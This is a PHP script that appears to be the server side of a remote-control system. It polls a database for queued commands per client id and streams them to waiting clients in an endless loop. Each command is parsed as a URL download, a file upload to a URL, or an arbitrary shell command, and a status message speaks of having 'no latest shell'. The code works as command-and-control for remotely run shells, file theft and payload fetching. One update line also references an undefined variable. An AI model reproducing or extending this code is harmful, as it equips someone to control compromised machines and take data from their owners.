<?php

include_once '../include/vendor.php';

set_time_limit(0);

$links = intval(substr(strrchr($_SERVER['REQUEST_URI'], 47), 1));

//$links = getPost('links', 0);

if (empty($links)) {
    exit('!!!###start{"return":0,"message":"\u53c2\u6570\u4e0d\u5b8c\u6574!"}end###!!!');
}

header('Content-type: text/html; charset=utf-8');


function getValue($str) {
    $str = trim($str);
    $arr = explode(' ', $str);

    if ($arr[0] === 'download') {
        $arr_o = [
            'type'  => 'download',
            'param' => [
                'url' => $arr[1],
                'dir' => empty($arr[2]) ? '' : $arr[2],
            ],
        ];
    } else if ($arr[0] === 'upload') {
        $arr_o = [
            'type'  => 'upload',
            'param' => [
                'file' => $arr[1],
                'url'  => empty($arr[2]) ? '' : $arr[2],

            ],
        ];
    } else {
        $arr_o = [
            'type'  => 'shell',
            'param' => [
                'run' => $str,
            ],
        ];
    }

    return $arr_o;
}

$interId = 0;
//for ($i = 0; $i < 6; $i++) {
do {
//    echo json_encode(['date' => date('Y-m-d'), 'mes' => 'success']);
//    echo 'json'.'start'.$i .'------'.date("H:i:s")."<br />".'end';

//    echo $i .'------'.date("H:i:s")."<br />";

    $dataOne = $db->getRow("SELECT * FROM interactz WHERE links_id= {$links} AND types = 0");

    if (count($dataOne) == 0) {
        echo '!!!###start' . json_encode(['return' => 1, 'message' => '没有最新的shell']) . 'end###!!!';
    } else {

        if ($interId == $dataOne['interactz_id']) {
            $where = 'interactz_id = '.$interactz;
            $db->autoExecute('interactz', ['send_count' => 'send_count + 1'], 'UPDATE', $where);
        }

        $interId = $dataOne['interactz_id'];

        $json = array_merge(getValue($dataOne['send_data']), [
            'interactz_id' => $dataOne['interactz_id'],
            'links_id'     => $dataOne['links_id'],
            'return'       => 2,
        ]);

        echo '!!!###start' . json_encode($json) . 'end###!!!' . "<br />";
    }

    flush(); //刷新并输出PHP缓冲数据
    ob_flush();
    sleep(3); //延迟3秒
} while(true);

echo json_encode(['date' => date('Y-m-d'), 'mes' => 'success']);


// 校验 md5
// 开头结束 start end
// 包号 -- 唯一 id ,
// 重发 , 数据库记录
// 长度， z utf-8
// lenght;

